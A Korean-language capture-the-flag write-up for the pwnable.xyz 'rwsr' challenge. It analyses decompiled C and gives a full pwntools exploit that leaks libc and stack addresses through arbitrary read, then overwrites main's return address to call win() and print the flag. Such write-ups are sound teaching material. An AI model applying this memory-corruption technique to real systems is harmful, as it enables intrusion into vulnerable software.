# [pwnable.xyz] rwsr

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> What's your target if you have arbitrary read and write?
>
> Release: [rwsr.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8990652/rwsr.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/175909641-499a1f4a-4718-4661-b816-6e3709a1888e.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

#### 1. Read

```c
        if ( ulong != 1 )
          break;
        printf("Addr: ");
        addr = (const char *)read_ulong();
        puts(addr);
```

주소를 입력받고 그 주소에 있는 문자열을 `puts()`로 출력한다.

#### 2. Write

```c
      if ( ulong != 2 )
        break;
      printf("Addr: ");
      _addr = (char *)read_ulong();
      addr = "Value: ";
      printf("Value: ");
      *(_QWORD *)_addr = read_ulong();
```

임의의 주소에 임의의 8바이트 값을 쓸 수 있다.

## Exploit

함수의 GOT를 leak하여 libc base를 알아낼 수 있다. `environ`을 leak하여 스택 주소를 계산할 수 있으므로, `main()`의 return address를 `win()`의 주소로 덮으면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
    puts_offset = 0x80970 # offset of puts() from libc base
    environ_offset = 0x61c118 # offset of environ from libc base
else:
    r = remote('svc.pwnable.xyz', 30019)
    puts_offset = 0x6fd60 # offset of puts() from libc base
    environ_offset = 0x3ba098 # offset of environ from libc base

sla = r.sendlineafter

def read(addr):
    sla('> ', '1')
    sla('Addr: ', str(addr))

def write(addr, value):
    sla('> ', '2')
    sla('Addr: ', str(addr))
    sla('Value: ', str(value))

puts_got = 0x600fa0
win = 0x400905


# libc leak

read(puts_got)

puts = u64(r.recvline()[:-1].ljust(8, b'\x00'))
libc = puts - puts_offset # libc base
log.info('libc base: ' + hex(libc))
environ = libc + environ_offset


# stack leak

read(environ)

rbp = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0xf8 # rbp of main()
log.info('rbp of main(): ' + hex(rbp))


# RET overwrite

write(rbp + 8, win)

sla('> ', '0') # return main()


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30019: Done
[*] libc base: 0x7fbffcebc000
[*] rbp of main(): 0x7ffd242f0310
[*] Switching to interactive mode
FLAG{__envir0n_ch3cked}
```